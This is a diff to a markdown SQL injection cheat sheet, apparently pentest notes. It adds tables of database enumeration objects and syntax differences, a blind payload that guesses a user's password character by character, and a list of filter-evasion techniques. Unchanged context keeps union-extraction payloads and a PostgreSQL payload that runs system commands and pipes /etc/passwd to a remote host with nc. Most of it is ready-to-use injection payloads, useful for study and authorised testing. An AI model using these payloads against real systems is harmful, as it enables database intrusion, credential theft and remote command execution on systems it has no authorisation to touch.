@@ -1,5 +1,24 @@
 # Unon based SQL Injection
 
+## Utils before start
+#### Database objects used for enumeration
+|Oracle 					| MS Access 		| MySQL 			| MSSQL Server		| PostgreSQL  		|
+|---------------------------|-------------------|-------------------|-------------------|-------------------|
+|SYS.USER_OBJECTS 			|MsysACEs			|mysql.user 		|sysobjects			|pg_default			|
+|SYS.TABLES, SYS.USER_TABLES|MsysObjects		|mysql.db 			|syscolumns			|pg_global			|
+|SYS.USER_VIEWS 			|MsysQueries		|mysql.tables_priv  |systypes			|					|
+|SYS.ALL_TABLES 			|MsysRelationship	|					|sysdatabases		|					|
+|SYS.COLUMNS 				|					|					|					|					|
+|SYS.USER_OBJECTS 			|					|					|					|					|
+
+#### Database features comparison
+|				| MySQL 		| MSSQL 		| MS Access 		| Oracle 		| DB2 			  | PostgreSQL 		|
+|---------------|---------------|---------------|-------------------|---------------|-----------------|-----------------|
+| String concat |concat\[_ws](,)| +				| &					|	\|\|		| concat(),+,\|\| | \|\|			|
+| Comments		| --,/**/,#		| --,\/*		|					| -- and \/*	| --			  |	--, \/*			|				
+| Request union | union 		| union, ;		| union 			| union 		| union 		  | union, ;		|
+
+
 ## Get columns number
 
 Check how many columns have current table using order by. When order by have the wrong number of columns, it will return an error:
@@ -73,6 +92,9 @@ SELECT * FROM `c5_logger_system` WHERE id=100 UNION SELECT ALL 1,2,3,4,5,6,7,8,t
 ## Extract data from table:
 ```
 '+union+select+NULL,concat(id, ';',engine, ';', type),NULL,NULL,NULL from cars--
+
+# Check if first character is between a-c 
+'+1=(SELECT 1 from users WHERE password REGEXP '^[a-c]' AND user_id=2)-- 
 ```
 
 ## Read files
@@ -100,12 +122,29 @@ SELECT * FROM `c5_logger_system` WHERE id=100 UNION SELECT ALL 1,2,3,4,5,6,7,8,t
 '; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080’)--
 ```
 
-## Cheat sheets
+## Evasion techniques
+1. In-line comment
+2. Char encoding
+3. String concat
+4. Obfuscating query
+5. Whitespaces
+6. Hex encoding
+7. Sophisticated matches
+8. URL Encoding
+9. Null byte
+10. Case variation
+11. Variables declaration
+12. IP Fragmentation
+13. Variations (OR 2+1=3, OR "AB"="a"+"b")
 
-https://portswigger.net/web-security/sql-injection/union-attacks
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-https://www.hackingloops.com/sql-injection-cheat-sheet/
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
-https://www.hackingloops.com/sql-injection-cheat-sheet/
-https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
-https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+
+
+
+## Cheat sheets
+- https://portswigger.net/web-security/sql-injection/union-attacks
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- https://www.hackingloops.com/sql-injection-cheat-sheet/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
+- https://www.hackingloops.com/sql-injection-cheat-sheet/
+- https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
+- https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
